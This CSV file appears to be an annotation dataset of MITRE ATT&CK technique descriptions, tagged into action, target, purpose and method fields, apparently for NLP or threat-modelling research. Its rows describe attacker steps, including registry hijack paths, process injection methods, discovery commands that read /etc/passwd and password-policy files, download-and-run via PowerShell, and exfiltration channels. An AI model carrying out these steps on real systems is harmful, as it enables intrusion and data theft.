0,0,1,2,tactic,technique,Id,action_what,action_where,where_attribute,when,when_condition,when_object,why_state,why_what,why_where,how,how_what,how_where,precondition,postcondition,alternative_technique,
,,,630,"defense evasion,persistence",sip and trust provider hijacking,t1198,modify,dll,,,,,,,,,,,,,,
,,,631,"defense evasion,persistence",sip and trust provider hijacking,t1198,,funcname registry value,hklm\software[wow6432node]microsoft\cryptography\oid\encodingtype 0\cryptsipdllverifyindirectdata{sip_guid},,,,,,,<what>pointing<\what> to a maliciously-crafted <where>dll<\where>,,,,,,
,,,632,"defense evasion,persistence",sip and trust provider hijacking,t1198,modify,dll,,,,,,,,,,,,,,
,,,633,"defense evasion,persistence",sip and trust provider hijacking,t1198,,function registry value,hklm\software[wow6432node]microsoft\cryptography\providers\trust\finalpolicy{trust provider guid},,,,,,,,varying,command and control protocols,,,,
,,,634,"defense evasion,persistence",sip and trust provider hijacking,t1198,hijack,sip,,,,,,,,,,,,,,
,,,635,"defense evasion,persistence",sip and trust provider hijacking,t1198,hijack,trust provider component,,,,,<what>enable<\what> persistent <where>code execution<\where>,enable,code execution,,use,web shell,,,,
,,,461,"defense evasion,persistence,command and control",port knocking,t1205 ,use,port knocking,,,,,"hide open ports from access , enable a port",,,,,,,,,
,,,462,"defense evasion,persistence,command and control",port knocking,t1205 ,send,packet,,,,,,,,"attempted connections to a predefined sequence of closed ports , unusual flags , specific strings",,,,,,
,,,457,"defense evasion,persistence,privilege escalation",plist modification,t1150,modify,plist file,,,,,<what>point<\what> to their own <where>code<\where> ,point,code,,,,,,,
,,,458,"defense evasion,persistence,privilege escalation",plist modification,t1150,bypass,whitelisting procedure,,,,,,,,,,,,,,
,,,459,"defense evasion,persistence,privilege escalation",plist modification,t1150,use,plist file,,,,,"<what>execute<\what> their <where>code<\where> in the context of another user , <what>bypass<\what> <where>whitelisting procedures<\where>","execute , bypass","code , whitelisting procedures",,,,,,,
,,,460,"defense evasion,persistence,privilege escalation",plist modification,t1150,use,plist file,,,,,persistence mechanism,,,,,,,,,
1,,,745,"defense evasion,persistence,privilege escalation,initial access",valid accounts,t1078 ,steal/capture,credential,"user , service account",credential access techniques/social engineering ,,," <what>gain<\what><where>access<\where> / 
 <what>gain<\what><where>remote access<\where> / 
<what>gain<\what><where>persistance access<\where> /
 <what>bypass<\what> <where>access controls<\where>/
<what>connect<\what> <where>remote environments<\where> /
<what>connect<\what> to <where> remote services<\where>",,,<what>using<\what> <where>credential access techniques<\where>;social engineering,using,credential access techniques/social engineering ,techniques: credential access; social engineering ,credential-captured,credential-captured,
,,,746,"defense evasion,persistence,privilege escalation,initial access",valid accounts,t1078 ,use,credential/private key,compromised/stolen/publicly disclosed,,,," <what>gain<\what><where>access<\where> / 
 <what>gain<\what><where>remote access<\where> / 
<what>gain<\what><where>persistance access<\where> /
 <what>bypass<\what> <where>access controls<\where>/
<what>connect<\what> <where>remote environments<\where> /
<what>connect<\what> to <where> remote services<\where>",,,,,,credential-captured,access-previlidged ,access-previlidged ,
,,,483,"defense evasion,privilege escalation",process injection,t1055,run,code,context of another process,,,,"<what>allow access<\what> to the <where>process's memory<\where>, <where>system resources <\where>/ <where> network resources<\where> , elevated privileges , <what>evade <\what> detection from security products","allow access , evade ","process's memory , system resources  ,  network resources",,,,,,,
,,,484,"defense evasion,privilege escalation",process injection,t1055,allow access,process memory,,,,,,,,,,,,,,
,,,485,"defense evasion,privilege escalation",process injection,t1055,"write , invoke execution","path to a malicious dll, dll",process,,,,,,,<what>creating<\what> a remote <where>thread<\where>,creating,thread,,,,
,,,486,"defense evasion,privilege escalation",process injection,t1055,"write , invoke execution","code, code",process,,,,,,,"additional code , <what>creating<\what> a remote <where>thread<\where>",creating,thread,,"reflective dll injection (writing a self-mapping dll into a process)  , memory module (map dll when writing into process) ","reflective dll injection (writing a self-mapping dll into a process)  , memory module (map dll when writing into process) ",
,,,487,"defense evasion,privilege escalation",process injection,t1055,inject code,thread of a process,,<condition><object>thread<\object> must first be suspended<\condition>,<object>thread<\object> must first be suspended,thread,,,,thread execution hijacking,,,,process hollowing,process hollowing,
,,,488,"defense evasion,privilege escalation",process injection,t1055,inject path to a dll,thread of a process,,<condition><object>thread<\object> must first be suspended<\condition>,<object>thread<\object> must first be suspended,thread,,,,thread execution hijacking,,,,process hollowing,process hollowing,
,,,489,"defense evasion,privilege escalation",process injection,t1055,attach code,apc queue,,<condition><object>thread<\object> enters an alterable state<\condition> ,<object>thread<\object> enters an alterable state,thread,<where>queued apc functions<\where> are <what>executed<\what>,executed,queued apc functions,,,,,,,
,,,490,"defense evasion,privilege escalation",process injection,t1055,"create , write , execute","suspended process , code, code",,,,,,,,apc,,,,,,
,,,491,"defense evasion,privilege escalation",process injection,t1055,utilize,apcs,,,,,<what>invoke<\what> malicious <where>code<\where>,invoke,code,,,,,,,
,,,492,"defense evasion,privilege escalation",process injection,t1055,manipulate pointer,portable executable (pe) ,,,,,<what>redirect<\what> a <where>process<\where> to malicious code,redirect,process,thread local storage (tls) callback injection,,,,,,
,,,493,"defense evasion,privilege escalation",process injection,t1055,redirect,process,,,,,,,,,,,,,,
,,,494,"defense evasion,privilege escalation",process injection,t1055,invoke,code,,,,,,,,,,,,,,
,,,495,"defense evasion,privilege escalation",process injection,t1055,use, environment variable,ld_preload ,,,,dynamically <what>load<\what> a <where>library (shared object) <\where> in a process,load,library (shared object) ,,,,,,,
,,,496,"defense evasion,privilege escalation",process injection,t1055,use, environment variable, dyld_insert_libraries (mac os x),,,,dynamically <what>load<\what> a <where>library (shared object) <\where> in a process,load,library (shared object) ,,,,,,,
,,,497,"defense evasion,privilege escalation",process injection,t1055,use, environment variable, ld_library_path (linux)  ,,,,dynamically <what>load<\what> a <where>library (shared object) <\where> in a process,load,library (shared object) ,,,,,,,
,,,498,"defense evasion,privilege escalation",process injection,t1055,use,dlfcn application programming interface (api) ,,,,,dynamically <what>load<\what> a <where>library (shared object) <\where> in a process,load,library (shared object) ,,,,,,,
,,,499,"defense evasion,privilege escalation",process injection,t1055,load,library,,,,,,,,,,,,,,
,,,500,"defense evasion,privilege escalation",process injection,t1055,use,ptrace system call,,,,,<what>attach<\what> to a <where>running process<\where> and <what>modify<\what> <where>it(running process)<\where> in runtime,"attach , modify","running process , it(running process)",,,,,,,
,,,501,"defense evasion,privilege escalation",process injection,t1055,attach  ,process,,,,,,,,,,,,,,
,,,502,"defense evasion,privilege escalation",process injection,t1055,modify,process,,,,,,,,,,,,,,
,,,503,"defense evasion,privilege escalation",process injection,t1055,use,/proc/[pid]/mem,,,,,"<what>access<\what> to the <where>memory of the process<\where> , <what>read<\what>/<what>write<\what> arbitrary <where>data<\where> to it. ","access , read , write","memory of the process , data",,manipulating,code stubs,,,,
,,,504,"defense evasion,privilege escalation",process injection,t1055,read,data,,,,,,,,,,,,,,
,,,505,"defense evasion,privilege escalation",process injection,t1055,write,data,,,,,,,,,,,,,,
,,,506,"defense evasion,privilege escalation",process injection,t1055,inject,elf binary,,,,,,,,<what>manipulating<\what> <where>code stubs<\where> mapped in from the linux-vdso.so shared object,utilizing,"named pipes , inter-process communication (ipc) mechanisms",,,,
,,,507,"defense evasion,privilege escalation",process injection,t1055,manipulate,code stub,,,,,,,,,,,,,,
,,,508,"defense evasion,privilege escalation",process injection,t1055,utilize,process injection,,,,,<what>access<\what> <where>system resources<\where> through whichpersistence and other environment modifications can be made,access,system resources,,,,,,,
,,,509,"defense evasion,privilege escalation",process injection,t1055,perform,process injection,,,,,"segment modules , evade detection",,,<what>utilizing<\what> <where>named pipes<\where> or other <where>inter-process communication (ipc) mechanisms<\where>,,,,,,
,,,510,"defense evasion,privilege escalation",process injection,t1055,segment,module,,,,,,,,,,,,,,
,,,511,"defense evasion,privilege escalation",process injection,t1055,utilize,interprocess communication(IPC),,,,,,,,,,,,,,
,,,512,"defense evasion,privilege escalation",process injection,t1055,utilize,named pipe,,,,,,,,,,,,,,
,,,691,discovery,System Service Discovery,t1007,obtain-information/get-information,service,registered,service is-a registered,,,,,,,,,,,,
,,,692,discovery,system time discovery,t1124,infer/gather,system time/time zone,,,,,,"execute-file, gather, dicover","information, locality information",,use,Net/net time \hostname/'w32tm /tz'/,,,Scheduled Task,
,,,513,discovery ,query registry,t1012,interact/query,windows registry,,,,,,gather,system-information/installed software infromation/system configuration information,,,,,,,
,,,682,discovery ,System Network Configuration Discovery,T1016,search/look,network configuration/system setting,,,,,,gather/discover,remote system information,,use,"Arp, ipconfig/ifconfig, nbtstat, route",,,,
,,,543,discovery ,remote system discovery,t1018,get-listing/use,"system/ IP address, hostname, or other logical identifier/local host file",,,,,,"get-listing/discover/gain-insight,gather/acquire","systems/hostname-ip address mappings,information-remote-system",,view/use,"c:\windows\system32\drivers\etc\hosts file,'/etc/hosts file'/net/ping",,,,
,,,688,discovery ,system owner/user discovery,t1033,identify,primary user/set of users/user,,,,,,"retrieve,querying","account username,information",,use,users/w/who,,,,
,,,683,discovery ,system network connections discovery,t1049,get-lisiting,network connection,,,,,,query,information,,use,netstat/net use/net session;losf/who -a/ who -w,,,,
,,,476,discovery ,process discovery,t1057,obtain-information/get-information,process,,,,,,"get , gain","information , understanding of common software running on systems",,use,tasklist utility/ps command,,,,
,,,577,discovery ,security software discovery,t1063,get-listing,security software/configuration/defensive tool/sensor,,,,,"get a listing of security software, configurations, defensive tools, and sensors that are installed on the system , <what>obtain<\what> <where>security software information<\where>",obtain,security software information,,use,"netsh, reg query with reg , dir with cmd , tasklist",,,,
,,,681,discovery ,system information discovery,t1082,obtain-information/get-information,operating system/hardware/operating system version/operating system patches/operating system hotfixes/service packs/hardware architecture,,,,,,get/identfy/acquire,information based on file directories,,use,"ver , systeminfo , dir",,,,
,,,18,discovery ,account discovery,t1087,get-listing,local system/domain account,,user is-a primary user/user has-a loggeed in,,,,enumerate,groups/users,,use/acquire-information,"net user  ,  net group ,  net localgroup  ,  dscl . list /groups , dscacheutil -q group  ,  /etc/passwd, groups/id",,,,
,,,48,discovery  ,application window discovery,t1010,get-listing,open application windows,,,,,,get-information,keylogger,,use,applescript script,,,,
,,,387,discovery  ,network service scanning,t1046,get-listing,remote host service,,,,,,acquire,information,,use,"port scans tools  ,  vulnerability scans tools",,,,
,,,239,discovery  ,file and directory discovery,t1083,enumerate,files/directories,,,,,,,,,,,,,,
,,,240,discovery  ,file and directory discovery,t1083,search,network shares/host locations,,,,,,"gather-information ,  interact","file/directory,windows api",,use,"dir/tree, ls/find/locatecommands",,,,
,,,453,discovery  ,peripheral device discovery,t1120,gather information,peripheral devices/connected computer,,,,,,enhance-awareness,system/network,,,,,,,
,,,391,discovery  ,network share discovery,t1135,look/search,folders and drives,shared  on remote systems,system/network has-a shared network drives and folders,,,,access file directories system/query remote system/query shared drive/lateral movement/collection,,,use,net share/net view \remotesystem/df -aH,,,,
,,,455,discovery  ,permission groups discovery,t1169,find/search,local system/domain-level group/  permissions setting,,,,,,,,,use,"net group /domain  ,  net localgroupusing  ,  dscacheutil -q group  ,  dscl . -list /groups  ,  groups  ,  ldapsearch",,,,
,,,447,discovery  ,password policy discovery,t1201,access detailed information,password policy,,,,,,"create  ,  launch","list  ,  dictionary  ,  brute force attacks",,use,"net accounts ,  net accounts /domain  ,  chage -l  ,  cat /etc/pam.d/common-password  ,  pwpolicy getaccountpolicies",,,,
,,,65,discovery  ,browser bookmark discovery,t1217,enumerate/list,browser bookmarks,,,,,,reveal.learn,"personal information/banking sites/interests/social media, compromised host",,,,,,,
,,,66,discovery  ,browser bookmark discovery,t1217,highlight/get-information,targets,,"adversary has-a valid credential, credential is-a associated with logins cached by a browser",,,,,,,,,,,,
,,,182,discovery  ,domain trust discovery,t1482,gather-information/dicover,domain trust relationships/information,,,,,identify <tech> lateral movement opportunities <\tech> in windows multi-domain/forest environments,identify,�Lateral Movement�opportunities in Windows multi-domain/forest environments,,,,,,,
,,,183,discovery  ,domain trust discovery,t1482,enumerated/list,domain trusts,,,,,"<what> conduct <\what>  <where>sid-history injection <\where>, <where>pass the ticket <\where>, and <where>kerberoasting<\where>",conduct,"sid-history injection  , pass the ticket  , kerberoasting",,use,"dsenumeratedomaintrusts() win32 api call , .net methods , ldap",,,,
,,,583,execution,service execution,t1035,execute,binary,,,,,,,,"method that <what>interacts<\what> with <where>windows services<\where>, such as the <where>service control manager<\where> , <what>creating<\what> a new <where>service<\where> , <<what>modifying<\what> an existing <where>service<\where>","interacts , creating , modifying","windows services/service control manager , service , service",,,,"new service , modify existing service"
,,,584,execution,service execution,t1035,create,service,,,,,,,,new service,"interacts , creating , modifying","windows services/service control manager , service , service",,,,"new service , modify existing service"
,,,585,execution,service execution,t1035,modify,service,,,,,,,,Modify service,,,,,,
,,,586,execution,service execution,t1035,execute,command ,,,,,,,,"method that <what>interacts<\what> with <where>windows services<\where>, such as the <where>service control manager<\where> , <what>creating<\what> a new <where>service<\where> , <<what>modifying<\what> an existing <where>service<\where>",,,,,,
,,,587,execution,service execution,t1035,execute,script,,,,,,,,"method that <what>interacts<\what> with <where>windows services<\where>, such as the <where>service control manager<\where> , <what>creating<\what> a new <where>service<\where> , <<what>modifying<\what> an existing <where>service<\where>",,,,,,
,,,771,execution ,windows management instrumentation,t1047,use,wmi,,,,,<what>interact<\what> with <attribute>local and remote<\attribute> <where>systems<\where> ; <what>gathering<\what> <where>information<\where> for discovery ; remote <what>execution <\what>of <where>files<\where> ,"interact , gathering , execution ","systems , information , files",,,,,,,
,,,772,execution ,windows management instrumentation,t1047,interact,system,remote,,,,,,,,use,<tech>exploitation for client execution<tech>,,,,
,,,773,execution ,windows management instrumentation,t1047,gather, information,,,,,,,,,,,,,,
,,,774,execution ,windows management instrumentation,t1047,remote-execute,file,,,,,,,,,,,,,,
,,,96,execution ,command-line interface,t1059,use,command-line interfaces,,,,,<what> interact <\what> with <where> systems <\where> and <what> execute <\what> other <where> software <\where> during the course of an operation,"interact  ,  execute","systems  ,  software",,,,,,,
,,,260,execution ,graphical user interface,t1061,use,system's gui,,,,,<what> search <\what> for <where> information <\where> <what> execute <\what> <where>files <\where>,"search  ,  execute","information  , files","remote interactive session such as remote desktop protocol  <where> mouse double-click events <\where>, the <where> windows run command <\where>",,"mouse double-click events  ,  windows run command",,,,
,,,466,execution ,poweshell,t1086,use,powershell,,,,,"<what> perform <\what> a number of <where> actions <\where>, including <what> discovery<\what> of <where> information <\where> and <what> execution <\what> of <where> code <\where>","perform  ,  discovery ,  execution","actions  ,  information  ,  code",<where> start-process cmdlet <\where> which can be used to <what> run <\what> an executable and the <where> invoke-command cmdlet <\where> which <what> runs <\what> a <attribute> command locally or on a remote computer <\attribute>,"run  ,  runs","start-process cmdlet  ,  invoke-command cmdlet",,,,
,,,467,execution ,poweshell,t1086,use,powershell,,<object> administrator permissions <\object> are <condition> required <\condition>,required,administrator permissions,"<what>download<\what> and <what>run<\what> <where> executables<\where> from the internet, which can be executed from disk or in memory without touching disk","download , run",executables,,,,,,,
,,,468,execution ,poweshell,t1086,use,"powershell/ empire, powersploit, and psattack",,,,,<what>connect <\what> to <where> remote systems <\where>,connect,remote systems,,,,,,,
,,,469,execution ,poweshell,t1086,executed,"empire, powersploit, and psattack  ,  powershell commands/scripts",,,,,,,,without directly invoking the powershell.exe binary through interfaces  the .net framework and windows common language interface (cli),,,,,,regsvcs/regasm
,,,521,execution ,regsvcs/regasm,t1086,use,regsvcs and regasm,,,,,<what> proxy execution <\what> of <where> code <\where>,proxy execution,code,trusted windows utility,,,,,,
,,,522,execution ,regsvcs/regasm,t1086,use,utilities (regsvcs and regasm),,before registration or unregistration: [comregisterfunction] or [comunregisterfunction] respectively,,,<what> bypass <\what> <where> process whitelisting <\where>  <where>specify code <\where>that should be <what> run <\what>,"bypass  ,  run","process whitelisting  , specify code",<what>use <\what> of attributes within the <where> binary <\where>,use,binary,,,,
,,,523,execution ,regsvcs/regasm,t1086,executed,code,registration and unregistration attributes,<object> process <\object> is run under <condition> insufficient privileges <\condition> and fails to execute,insufficient privileges,process,,,,,,,,,,
,,,203,execution ,execution through api,t1106,use,windows application programming interface (api),additional,,,,<what> execute <\what><where> binaries <\where>,execute,binaries,,,,,,,
,,,204,execution ,execution through api,t1106,use,windows api calls,,,,,<what> execute <\what> <where> binaries <\where>,execute,binaries,"•	<where> createprocessa() <\where> <where> createprocessw() <\where>,•	<where> createprocessasusera()  <\where> <where> createprocessasuserw() <\where>,,•	<where> createprocessinternala() <\where>  <where>  createprocessinternalw() <\where>,,•	<where> createprocesswithlogonw() <\where> <where>   createprocesswithtokenw() <\where>•	<where> loadlibrarya() <\where> <where>  loadlibraryw() <\where>,,•	<where> loadlibraryexa() <\where> <where>  loadlibraryexw() <\where>,,•	<where> loadmodule() <\where>,•	<where> loadpackagedlibrary() <\where>,•	<where> winexec() <\where>,•	<where> shellexecutea() <\where><where>  shellexecutew() <\where>,•	<where> shellexecuteexa() <\where><where>  shellexecuteexw() <\where>,",,"createprocessa()  ,  createprocessw()  ,  createprocessasusera()   ,  createprocessasuserw()  ,  createprocessinternala()  ,   createprocessinternalw()  ,  createprocesswithlogonw()  ,    createprocesswithtokenw()  ,  loadlibrarya()  ,   loadlibraryw()  ,  loadlibraryexa()  ,   loadlibraryexw()  ,  loadmodule()  ,  loadpackagedlibrary()  ,  winexec()  ,  shellexecutea()  ,   shellexecutew()  ,  shellexecuteexa()  ,   shellexecuteexw()",,,,
,,,205,execution ,execution through module load,t1129,called,windows native api,,,,,,,,"createprocess(), loadlibrary(), etc. of the win32 api the module loader can <what> load <\what> <where> dlls <\where>:•	via specification of the (fully-qualified or relative) dll pathname in the import directory;•	via export forwarded to another dll, specified with (fully-qualified or relative) pathname (but without extension);•	via an <attribute> ntfs junction <\attribute> or <attribute> symlink program.exe.local <\attribute> with the fully-qualified or relative pathname of a directory containing the dlls specified in the import directory or forwarded exports;•	via <attribute> <file name=filename.extension loadfrom=fully-qualified or relative pathname> <\attribute>in an embedded or external application manifest. the file name refers to an entry in the import directory or a forwarded export.",load,dlls,,,,
,,,206,execution ,execution through module load,t1129,use,this functionality,,,,,<what> execute <\what> arbitrary <where>code <\where>on a system,execute,code,,,,,,,
,,,213,execution ,exploitation for client execution,t1129,compromised,endpoint systems,,,,,,,,normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser,,,,,,
,,,193,execution ,dynamic data exchange,t1173,exchange,transactions consisting of strings,,link is established,,,,,,,,,,,,
,,,194,execution ,dynamic data exchange,t1173,use,"warm data links (notifications when a data item changes)  ,  hot data links  (duplications of changes to a data item)  ,  requests",,"superseded by com, dde",,,command execution  <what> enabled <\what> in <where> windows 10 <\where> and most of <where> microsoft office 2016<\where> via <where> registry keys <\where>,enabled,"windows 10  ,  microsoft office 2016 ,  registry keys",,,,,,,
,,,195,execution ,dynamic data exchange,t1173,poisoned,"dde  ,  microsoft office documents",,,,,<what> execute <\what>arbitrary <where> commands <\where>  <what> deliver <\what> <where> execution <\where> via <attribute> phishing campaigns or hosted web content <\attribute>  <what> avoiding <\what> the use of visual basic for applications (vba) macros,"execute  ,  deliver  ,  avoiding","commands  ,  execution","dde commands, directly or through embedded files",,,,,,
,,,196,execution ,dynamic data exchange,t1173,leveraged,dde,,does not have direct access to command line execution,,,,,,adversary operating on a compromised machine,,,,,,
,,,743,execution ,user execution,t1204,execute,code,,"user <condition>opens a malicious <object>executable<\object> delivered via spearphishing attachment<\condition> , 
when a <condition>user clicks on a <object>link<\object> delivered via spearphishing link<\condition>  , adversary <condition>places a <object>file<\object> in a shared directory or on a user's desktop<\condition>","opens a malicious <object>executable<\object> delivered via spearphishing attachment , user clicks on a <object>link<\object> delivered via spearphishing link , places a <object>file<\object> in a shared directory or on a user's desktop","executable , link , file",<what>exploitation<\what> of a <where>browser or application vulnerability<\where>,exploit,browser or application vulnerability,use <tech>exploitation for client execution<tech>,,,,,,
,,,744,execution ,user execution,t1204,exploit,browser/application vulnerability,,,,,,,,,,,,,,
,1,,779,"execution, lateral movemnet",windows remote management,t1028,"run,modify","executable,registry/service",,,,,,,,"winrm command , powershell. ",use,third-party software,,,,
,,,711,"execution,lateral movement",third-party software,t1072,use, third-party software,,adversary <condition>gains access<\condition> to these <object>systems<\object>,gains access,systems,,,,,,,,,,
,,,712,"execution,lateral movement",third-party software,t1072,execute,code,,local credentials may be sufficient with direct access to the deployment server; specific domain credentials may be required ; administrative account to log in or to perform software deployment. ,,,"remote <where>code<\where> <what>execution<\what> on all systems that are connected to such a system , laterally <what>move<\what> to <where>systems<\where> , <what>gather<\what> <where>information<\where> , cause a specific effect , <what>wiping<\what> the <where>hard drives<\where> on all endpoints","execution, gather, wipe","code, information, hard drive",using third-party software,,,,,,
,,,713,"execution,lateral movement",third-party software,t1072,execute,code,,,,,,,,using third-party software,use,third-party software,,,,
,,,714,"execution,lateral movement",third-party software,t1072,gather,information,,,,,,,,,use,third-party software,,,,
,,,715,"execution,lateral movement",third-party software,t1072,wipe, hard drive,,,,,,,,,,,,,,
,,,716,"execution,lateral movement ",third-party software,t1072,execute,code,,"if an adversary <condition>gains access<\condition>,  to these <object>systems<\object> , <condition>access to a network-wide or enterprise-wide <\condition><object>software deployment system<\object>","gains access , access to a network-wide or enterprise-wide ","systems , software deployment system","laterally move to systems , gather information , wiping the hard drives on all endpoints",,,using third-party software,,,,,,
,,,717,"execution,lateral movement ",third-party software,t1072,execute,code,,"<condition>local credentials may be sufficient with direct access<\condition> to the <object>deployment server<\object> , <condition>specific domain credentials may be required<\condition> , the system may require an <condition><object>administrative account<\object> to log in or to perform software deployment<\condition>","local credentials may be sufficient with direct access , specific domain credentials may be required , <object>administrative account<\object> to log in or to perform software deployment","deployment server , administrative account , administrative account","laterally move to systems , gather information , wiping the hard drives on all endpoints",,,using third-party software,"replacing , adding",drivers,,,,"dll side-loading , dll search order hijacking"
,,,718,"execution,lateral movement ",third-party software,t1072,wipe,hard drive,,,,,,,,,"replacing , adding",drivers,,,,"dll side-loading , dll search order hijacking"
,,,725,"Execution,persistence",Trap,T1154,use,trap,trap 'command list' signals,shell encounters specific interrupts,interrupts,shell,<what>register<\what> <where>code<\where> to be executed,register,code,trap 'command list'signals,,,,,,
,,,342,"execution,persistence ",lsass driver,t1177,target/use,lsass.exe drivers,,,,,obtain execution  persistence,,,"<what> replacing <\what> or <what> adding <\what> <attribute> illegitimate <\attribute> <where> drivers <\where> (e.g., <where> dll side-loading <\where>or <where> dll search order hijacking <\where>)","replacing  ,  adding","drivers  ,  dll side-loading  ,  dll search order hijacking",,,,
,,,343,"execution,persistence ",lsass driver,t1177,triggered,code execution,,,,,,,,continuous <where> lsa operations<\where>,,lsa operations,,,,
,1,,565,"execution,persistence,privilege escalation",scheduled task,t1053,execute/run,program,,scheduling a task on a remote system typically required being a <condition>member of the <object>administrators group<\object><\condition> on the the remote system.,member of the <object>administrators group<\object>,administrators group,"execute programs at system startup or on a scheduled basis forpersistence , conduct remote execution as part of lateral movement , gain system privileges , run a process under the context of a specified account",,,"at , schtasks",use,task scheduling,,,,"exfiltration over command and control channel , exfiltration over alternative protocol"
,1,,566,exfiltration,scheduled transfer,t1029 ,exfiltrate,data,,,,,blend traffic patterns with normal activity,blend  ,traffic pattern,"certain times of day , certain intervals",use,command and control channel,,,,
,,,208,exfiltration,exfiltration over command and control channel,t1041 ,exfiltrate,data,,,,,,,,using command and control channel,,,,,,
,,,209,exfiltration,exfiltration over command and control channel,t1041 ,encode,data,,,,,,,,same protocol as command and control communications,,,,,,
,1,,211,exfiltration,exfiltration over physical medium,t1052 ,exfiltrate,data,,air gapped network compromise,,,,,,"physical medium or device introduced by a user , external hard drive , usb drive , cellular phone , mp3 player",use,physical medium/device/external hard drive/usb drive/cellular phone/mp3 player,,final exfiltration point/hop betweeen disconnected system,final exfiltration point/hop betweeen disconnected system,
,1,1,148,exfiltration ,data compressed,t1002,compress,data/documents,,<condition> collected <\condition> <obejct>data<\object>,collect,data,prior to exfiltration  make <where> data <\where> it <what> portable <\what> and minimize the amount of <where> data <\where> <what> sent <\what> over the network,minimize,data-length,,,program/algorithm/compression library/utility/7zip/rar/zip/zlib,compression-utility-access,data-compressed,data-compressed,
,,,210,exfiltration ,exfiltration over other network medium,t1011 ,exfiltrate,,," <condition>sufficient access or proximity<\condition>, and the <object>connection<\object> might <condition>not be secured or defended as well as the primary internet-connected channel<\condition>",sufficient access or proximity,connection,,,,"wifi connection , modem , cellular data connection , bluetooth , radio frequency (rf) channel",,,,,,
,1,,55,exfiltration ,automated exfiltration,t1020,exfiltrate,data/document,sensitive,<condition> gathered during collection <\condition> <object>data<\object>,gathered during collection,data,,,,automated processing/scripting,,,,,,
,1,,150,exfiltration ,data encrypted,t1022,"encrypt , hide , exfiltrate",data,,,,,<what>hide<\what> the <where> information<\where> that is being exfiltrated from detection  make the exfiltration less conspicuous upon inspection by a defender,hide/transfer,information,"utility, programming library, or custom algorithm on the data itself  exfiltration over command and control channel and exfiltration over alternative protocol",performed/use,utility/programming library/custom algorithm/,,,,
,1,,158,exfiltration ,data transfer size limits,t1030,exfiltrate,data,,,,,avoid triggering network data transfer threshold alerts,avoid,network data tranfer alert,fixed size chunks instead of whole files  limit packet sizes below certain thresholds,use,data size limits/fixed size chunks/limit packet size,,,,
,1,,207,exfiltration ,exfiltration over alternative protocol,t1048,sent,channel/data,alternate network location,,,,data exfiltration,,,"<where> ftp <\where>, <where> smtp <\where>, <where> http/s <\where>, <where> dns <\where>, or <where> some other network protocol <\where>  <where> internet web services <\where> such as <where> cloud storage <\where>",use,"ftp  ,  smtp  ,  http/s  ,  dns  ,  some other network protocol  ,  internet web services  ,  cloud storage",,,,
1,,,650,initial access,spearphishing link,t1192,use,URL/link,,,,,<what>download<\what> <where>malware<\where> contained in email ; <what>avoid<\what> <where>defenses<\where> that may inspect email attachments,"download , avoid","malware , defenses",social engineering text,using ,exploit,"account-address-discovered; 
techniqe:discovery ",,,
,,,651,initial access,spearphishing link,t1192,download ,malware,,,,,,,,,using ,exploit,"account-address-discovered; 
techniqe:discovery ",user-information-gathered,user-information-gathered,
,,,652,initial access,spearphishing link,t1192,accompany,link/URL,,link/URL is-a clikced ,,,,,,<what> leveraging<\what> <where>user execution<\where>,embedded images,,,,,
,,,653,initial access,spearphishing link,t1192,compromise,web browser,,,,,"<what>download<\what> <where>applications<\where>, <where>documents<\where>, <where>zip files<\where>, or even <where>executables<\where>",download ,"application, document, zip file, executable","<how><what>using<\what> an <where>exploit<\where><\how>, ",,,supplychain-system-access,execution-for-access -gained,execution-for-access -gained,
,,,654,initial access,spearphishing link,t1192,prompt/solicit,user,,,,,"<what>download<\what> <where>applications<\where>, <where>documents<\where>, <where>zip files<\where>, or even <where>executables<\where>",download ,"application, document, zip file, executable","<how><what>using<\what> an <where>exploit<\where><\how>, ",,,,,,
,,,655,initial access,spearphishing link,t1192,include,link,,link/URL is-a clikced ,,,"<what>infect<\what> system<\where> /
<what>interact<\what> user<\where> /
<what>verify<\what> email adress<\where> /
<what>solicit<\what> user info<\where> /
<what>download<\what> code<\where>by user clicking ","interact , exploit , verify","email reader , end system , receipt",,,,,,,
1,,,656,initial access,spearphishing via service,t1194,send,message/content,,user info discovery,,,<what>generate<\what> <where>rapport<\where> with the target ; <what>get<\what> the target's interest,"generate , get",rapport,"social media services , personal webmail , non-enterprise controlled services",,,"account-address-discovered; 
techniqe:discovery ",,,
,,,657,initial access,spearphishing via service,t1194,"create , message , send","social media account , employee , link/attachment","fake , ,malicious",,,,"<what>open<\what>  <where>attachment<\where> by user/
<what>click <\what>  <where>link<\where> by user",,,"potential job opportunities; asking about services, policies, and software that's running in an environment,",,,"account-address-discovered; 
techniqe:discovery ",,,
